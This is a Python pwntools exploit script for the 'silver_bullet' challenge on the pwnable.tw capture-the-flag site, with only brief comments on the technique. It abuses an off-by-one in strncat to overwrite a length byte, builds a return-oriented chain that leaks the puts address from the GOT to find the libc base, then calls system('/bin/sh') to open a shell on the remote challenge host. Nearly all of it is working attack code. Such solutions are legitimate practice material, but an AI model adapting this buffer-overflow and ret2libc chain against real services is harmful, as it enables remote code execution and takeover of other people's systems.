from pwn import *
#context.log_level = 'DEBUG'
elf = ELF("silver_bullet")
#libc = ELF("/lib/i386-linux-gnu/libc.so.6")
libc = ELF("libc_32.so.6")
r = remote("chall.pwnable.tw", 10103)
#r = gdb.debug("./silver_bullet")

def create(x):
    r.recvuntil( 'Your choice :' )
    r.write( '1' )
    r.recvuntil( 'Give me your description of bullet :' )
    r.write(x)

def powerup(x):
    r.recvuntil( 'Your choice :' )
    r.write( '2' )
    r.recvuntil( 'Give me your another description of bullet :' )
    r.write(x)

def beat():
    r.recvuntil( 'Your choice :' )
    r.write( '3' )

main = p32(elf.symbols["main"])
puts_plt = p32(elf.plt["puts"])
got_puts = p32(elf.got["puts"])

create("A"*47)
powerup("B")

#strncat -> string1 + string2 + \x00
#48 max chars
#power_up to overwrite length byte
#leak libc puts and get libc.addr


payload = b'\xff'*3 + b"A"*4 + puts_plt + main + got_puts
powerup(payload)
beat()
r.recvuntil("Oh ! You win !!\n")
puts_address = u32(r.recv(4))
libc.address = int(puts_address) - int(libc.symbols["puts"])

binsh = int(next(libc.search(b'/bin/sh')))
system = int(libc.symbols["system"])
exit = libc.sym['exit']

create("A"*47)
powerup("B")

#payload = b'\xff'*3 + b"A"*4 + p32(libc.address+0x5f065)
payload = b'\xff'*3 + b"A"*4 + p32(system) + p32(exit) + p32(binsh)
powerup(payload)
beat()
r.interactive()
